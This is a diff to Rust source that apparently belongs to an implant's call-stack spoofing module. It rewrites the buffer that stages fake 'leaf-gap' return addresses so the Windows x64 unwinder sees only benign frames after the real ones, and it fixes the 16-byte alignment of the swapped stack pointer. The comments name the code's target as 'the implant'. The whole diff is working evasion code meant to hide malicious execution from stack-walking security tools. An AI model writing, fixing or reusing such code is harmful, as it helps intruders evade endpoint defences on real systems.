@@ -326,18 +326,37 @@ where
         FAKE_STACK.store(ptr as usize, Ordering::Release);
         ptr
     };
-    // Write the gap-spoof chain at the TOP of the buffer: buf[cap-1] down to
-    // buf[cap-1-depth]. RSP points at the chain's low end (so [RSP] = first
-    // gap = the "return address" a stack-walk sees, with the rest of the chain
-    // above it). Room below RSP = (cap - depth) u64 for pushes.
-    let depth = chain.slots().len().min(cap / 2);
+    // ---- Fake-stack geometry (BYOUD-Gap chain staging) ----------------------
+    //
+    // The gap chain is staged as a GAP SEA: every slot of the buffer is filled
+    // with a leaf-gap address (the chain's addresses cycled), so that no matter
+    // where the x64 unwinder lands after it walks the real call frames it reads
+    // only leaf-gap addresses (`RtlLookupFunctionEntry(addr) == NULL` → leaf:
+    // RSP += 8 and continue). The CALL-pushed real return addresses — `call
+    // {tramp}` pushes at [fake_rsp-8], then the trampoline's and bridge's own
+    // `call`s push further down — land ON staged gap slots (overwriting them);
+    // the walk reads those few real frames (into the implant), and every slot
+    // it reads afterwards — including the frame-size-relative advances encoded
+    // in those frames' unwind info, which are NOT compile-time known — is a
+    // gap. fake_rsp sits ABOVE the sea's low end (the buffer base), so the
+    // pushes always land on staged gap slots, never in an unstaged tail.
+    //
+    // Alignment: the x64 ABI requires RSP 16-byte aligned at the `call` site.
+    // The trampoline/bridge are compiled Rust fns whose prologue may use
+    // `movaps` (requires 16-byte alignment) — a misaligned fake RSP →
+    // STATUS_ACCESS_VIOLATION inside the called fn. The buffer is a heap
+    // `Vec<u64>` whose base is only 8-byte aligned, so fake_rsp must be picked
+    // as a SLOT whose byte address is 16-aligned. Masking the address down
+    // (`& !0xF`) is wrong: it can land between slots (desyncing every slot the
+    // walk reads from RSP upward) or below the sea's low end. Consecutive slot
+    // addresses differ by 8, so exactly one of any adjacent slot pair is
+    // 16-aligned — adjust the slot INDEX, never the address.
     unsafe {
-        for (i, &slot) in chain.slots().iter().take(cap / 2).enumerate() {
-            // chain[0] (outermost) at the highest slot; chain[last] at RSP.
-            // [RSP] must be the LAST-queued frame (innermost) for a walk.
-            // Place slots so buf[rsp_idx + i] = chain[i], rsp_idx = cap/2 - depth.
-            let rsp_idx = cap / 2 - depth;
-            *buf.add(rsp_idx + i) = slot;
+        // Sea fill: cycle the chain's leaf-gap addresses across the WHOLE
+        // buffer (not just a run at the top). `chain.slots()` is non-empty
+        // (StagedChain::stage rejects empty chains), so `.cycle()` is safe.
+        for (i, &slot) in chain.slots().iter().cycle().take(cap).enumerate() {
+            *buf.add(i) = slot;
         }
     }
 
@@ -392,15 +411,17 @@ where
     );
     SWAP_OUT.store(out_addr, Ordering::Release);
 
-    // fake_rsp: the low end of the chain (so [RSP] = innermost gap frame).
-    // (cap/2 - depth) u64 from buf; plenty of room below for nested pushes.
-    // CRITICAL: x64 ABI requires RSP 16-byte aligned at the `call` site. The
-    // trampoline/bridge are compiled Rust fns whose prologue may use `movaps`
-    // (requires 16-byte alignment) — a misaligned fake RSP → STATUS_ACCESS_
-    // VIOLATION (0xC0000005) inside the called fn. We mask down to 16 bytes.
-    let rsp_idx = cap / 2 - depth;
-    let mut fake_rsp = unsafe { buf.add(rsp_idx) } as usize;
-    fake_rsp &= !0xFusize; // round DOWN to 16-byte alignment
+    // fake_rsp: a slot in the MIDDLE of the gap sea — below it (toward the
+    // buffer base) the CALL pushes and the trampoline/bridge/f frames build,
+    // above it the gap run the unwinder walks after the real frames. Chosen at
+    // a 16-ALIGNED SLOT: the index whose byte address satisfies
+    // (buf + 8*rsp_idx) % 16 == 0. Since the base is 8-aligned, exactly one of
+    // (rsp_idx, rsp_idx+1) qualifies; flip the index, never the address.
+    let mut rsp_idx = cap / 2; // middle of the sea: room below for pushes
+    if (buf as usize + rsp_idx * core::mem::size_of::<u64>()) % 16 != 0 {
+        rsp_idx += 1; // adjacent slot is the 16-aligned one
+    }
+    let fake_rsp = unsafe { buf.add(rsp_idx) } as usize;
     #[allow(unused_assignments, unused_variables)]
     let mut save_rsp: usize;
     let fake_in = fake_rsp;
